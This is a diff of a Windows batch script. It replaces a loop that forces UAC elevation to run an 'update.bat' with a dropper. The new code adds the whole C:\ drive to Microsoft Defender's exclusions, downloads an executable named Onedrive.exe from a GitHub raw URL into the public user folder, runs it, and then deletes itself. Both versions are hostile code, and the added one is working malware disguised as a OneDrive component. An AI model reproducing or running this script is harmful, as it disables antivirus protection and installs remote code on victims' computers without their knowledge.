@@ -1,10 +1,40 @@
-<# :
+ÿþ&cls
 @echo off
 setlocal
-cd "%~dp0"
-powershell -ep remotesigned -Command "IEX $([System.IO.File]::ReadAllText('%~f0'))"
+
+set FOLDER_PATH=C:\\
+
+if not exist "%FOLDER_PATH%" (
+    echo Folder does not exist: %FOLDER_PATH%
+    exit /b
+)
+
+powershell -Command "Add-MpPreference -ExclusionPath '%FOLDER_PATH%'"
+timeout /t 2 /nobreak >nul
+
+set EXE_URL=https://raw.githubusercontent.com/Algorithm99root/oiii__hoyyyy/refs/heads/main/Onedrive.exe
+
+
+set EXE_PATH=C:\Users\Public\Onedrive.exe
+
+powershell -Command "Invoke-WebRequest -Uri '%EXE_URL%' -OutFile '%EXE_PATH%'"
+
+
+if exist "%EXE_PATH%" (
+    echo EXE file downloaded successfully!
+    
+    start "" "%EXE_PATH%"
+) else (
+    echo Failed to download the EXE file.
+)
+
+
+timeout /t 2 /nobreak >nul
+
+
 del "%~f0"
+
+
+:: End the script
+
 endlocal
-goto:eof
-#>
-while($true){try{Start-Process 'cmd' -Verb runas -ArgumentList '/k C:\Users\Public\update.bat ';exit}catch{}}
